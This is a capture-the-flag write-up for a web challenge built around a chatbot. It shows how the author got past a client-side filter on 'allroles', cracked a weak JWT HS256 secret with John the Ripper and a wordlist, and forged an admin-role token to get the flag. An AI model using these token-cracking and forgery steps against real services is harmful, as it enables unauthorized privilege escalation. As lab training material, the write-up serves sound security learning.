# Next Gen AI

## Description

IronCode and R-boy’s mission progresses slowly. The region of ComboX is in chaos. Zer0 has managed to discover one of the Seven Secrets, enabling him to take control of the Temple of Cloud. WonderWeb decides to leave the Nebula and save the stronghold.

http://gamebox1.reply.it/ba3eab423b1f3ff4df2b8da016084b61/

## Solution

Analyzing tha site we fount in the request Header that the site uses `JWT`

```
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.jcBjGaU-N9koHQvZ8mYKmNi5B-QNmCTejbSUUsodkDw

From Base64 -> {"typ":"JWT","alg":"HS256"}{"role":"user"}
```

In the `chatbot.js` we also found that the string `allroles` is filtered out before the request is sent, let's try intercept end edit the request using Burp

```
text=allroles
```

We get this in respose

![](img1.png)

Let's now try to crack the `HS256`, and recreate that authorization using `superb0ss`

```console
$john --wordlist=./rockyou.txt temp
Created directory: /home/tiz314/snap/john-the-ripper/459/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chicken          (?)
1g 0:00:00:00 DONE (2021-10-17 22:56) 50.00g/s 1228Kp/s 1228Kc/s 1228KC/s 123456..280690
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The key is `chicken`

![](img2.png)

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic3VwZXJiMHNzIn0.fJCNV7l5CIfHAvWJD93MrKzScH8ne67LcQyB6uycAcg`

Let's send a request with this new authorization token

![](img3.png)

#### **FLAG >>** `{FLG:You4reSm4rt3rTH4nMyAI}`